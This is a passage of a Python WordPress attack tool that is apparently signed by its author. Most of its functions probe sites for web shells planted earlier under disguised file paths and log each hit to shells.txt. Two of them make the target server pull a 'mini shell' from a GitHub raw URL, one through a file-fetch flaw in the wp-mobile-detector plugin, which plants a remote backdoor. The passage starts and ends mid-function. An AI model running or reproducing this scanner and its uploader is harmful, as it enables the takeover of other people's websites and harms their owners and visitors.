                print (' [#] Exploit 53 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-widgets-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-customize-widgets-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 53 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-widgets-ajax.php\n')
            else:
                print ('[#] Exploit 53 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_54(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/atomlib-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 54 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/atomlib-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/atomlib-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 54 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/atomlib-private.php\n')
            else:
                print ('[#] Exploit 54 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#45full complete 

def exploit_55(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-background-position-control-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 55 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-background-position-control-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-background-position-control-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 55 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-background-position-control-ajax.php\n')
            else:
                print ('[#] Exploit 55 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_56(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/sodium_compat/autoload-php7-meta.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 56 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/sodium_compat/autoload-php7-meta.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/sodium_compat/autoload-php7-meta.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 56 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/sodium_compat/autoload-php7-meta.php\n')
            else:
                print ('[#] Exploit 56 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_57(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-user-request-cron.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 57 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-user-request-cron.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-user-request-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 57 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-user-request-cron.php\n')
            else:
                print ('[#] Exploit 57 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_58(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/feed-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 58 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/feed-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/feed-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 58 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/feed-private.php\n')
            else:
                print ('[#] Exploit 58 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_59(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-recovery-mode-email-service-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 59 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-recovery-mode-email-service-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-recovery-mode-email-service-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 59 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-recovery-mode-email-service-private.php\n')
            else:
                print ('[#] Exploit 59 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_60(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-locale-switcher-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 60 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-locale-switcher-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-locale-switcher-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 60 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-locale-switcher-ajax.php\n')
            else:
                print ('[#] Exploit 60 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#call me h0rn3t sp1d3rs 
#60 exploit done
def exploit_61(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/block-template-utils-core.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 61 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/block-template-utils-core.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/block-template-utils-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 61 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/block-template-utils-core.php\n')
            else:
                print ('[#] Exploit 61 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_62(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 62 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-ajax.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 62 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-ajax.php\n')
            else:
                print ('[#] Exploit 62 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_63(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-session-tokens-core.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 63 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-session-tokens-core.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-session-tokens-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 63 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-session-tokens-core.php\n')
            else:
                print ('[#] Exploit 63 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_64(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-widget-area-customize-control-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 64 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-widget-area-customize-control-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-widget-area-customize-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 64 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-widget-area-customize-control-stream.php\n')
            else:
                print ('[#] Exploit 64 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_65(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-walker-category-dropdown-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 65 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-walker-category-dropdown-ajax-response.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-walker-category-dropdown-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 65 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-walker-category-dropdown-ajax-response.php\n')
            else:
                print ('[#] Exploit 65 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_66(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 66 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-ajax-response.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 66 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-ajax-response.php\n')
            else:
                print ('[#] Exploit 66 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_67(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-customize-control-wp.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 67 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-wp.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-customize-control-wp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 67 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-wp.php\n')
            else:
                print ('[#] Exploit 67 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_68(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-customize-nav-menus-core.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 68 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-nav-menus-core.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-customize-nav-menus-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 68 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-nav-menus-core.php\n')
            else:
                print ('[#] Exploit 68 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_69(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/customize/class-wp-customize-image-control-private.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 69 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-image-control-private.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/customize/class-wp-customize-image-control-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 69 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-image-control-private.php\n')
            else:
                print ('[#] Exploit 69 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_70(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/block-patterns/two-buttons-core.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 70 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/block-patterns/two-buttons-core.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/block-patterns/two-buttons-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 70 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/block-patterns/two-buttons-core.php\n')
            else:
                print ('[#] Exploit 70 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_71(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/embed-template-core.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 71 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/embed-template-core.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/embed-template-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 71 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/embed-template-core.php\n')
            else:
                print ('[#] Exploit 72 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_72(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/IXR/class-IXR-date-stream.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 72 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/IXR/class-IXR-date-stream.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/IXR/class-IXR-date-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 72 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/IXR/class-IXR-date-stream.php\n')
            else:
                print ('[#] Exploit 72 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_73(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/theme-compat/wp-aespa.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 73 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/theme-compat/wp-aespa.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/theme-compat/wp-aespa.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 73 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/theme-compat/wp-aespa.php\n')
            else:
                print ('[#] Exploit 73 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_74(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 74 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/rest-api/tablepress_controllers.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 74 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/rest-api/tablepress_controllers.php\n')
            else:
                print ('[#] Exploit 74 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_75(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 75 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 75 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
            else:
                print ('[#] Exploit 75 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_76(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                print (' [#] Exploit 76 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/rest-api/tablepress_controllers.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 76 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/rest-api/tablepress_controllers.php\n')
            else:
                print ('[#] Exploit 76 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#all done
#76 done.
def exploit_77(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/shell20211028.php',headers=headers, allow_redirects=True,timeout=15)
        if "<input type=hidden name=p1 value='uploadFile'>" in check.content.decode("utf-8"):
                print (' [#] Exploit 77 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/shell20211028.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type=hidden name=p1 value='uploadFile'>" in check.content.decode("utf-8"):
                    print (' [#] Exploit 77 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/shell20211028.php\n')
            else:
                print ('[#] Exploit 77 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_78(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/index.php?x=ooo',headers=headers, allow_redirects=True,timeout=15)
        if "<input type='file'name='file' /><input type='submit' value='up' />" in check.content.decode("utf-8"):
                print (' [#] Exploit 78 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/index.php?x=ooo\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/index.php?x=ooo',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='file'name='file' /><input type='submit' value='up' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 78 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/index.php?x=ooo\n')
            else:
                print ('[#] Exploit 78 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_79(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
        if ('mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8")):
                print (' [#] Exploit 79 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8"):
                    print (' [#] Exploit 79 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
            else:
                print ('[#] Exploit 79 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_80(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check0 = requests.get(url+'/wp-content/plugins/wp-mobile-detector/resize.php?src=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
        check = requests.get(url+'/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
        if ('mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8")):
                print (' [#] Exploit 80 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check0 = requests.get(url+'/wp-content/plugins/wp-mobile-detector/resize.php?src=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
            check = requests.get(url+'/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8"):
                    print (' [#] Exploit 80 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php\n')
            else:
                print ('[#] Exploit 80 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_81(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/SYSADMIN-CMQDSR.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 81 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/SYSADMIN-CMQDSR.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/SYSADMIN-CMQDSR.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 81 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/SYSADMIN-CMQDSR.php\n')
            else:
                print ('[#] Exploit 81 --> ' + url + ' {}[Failed]'.format(fr))
    except:
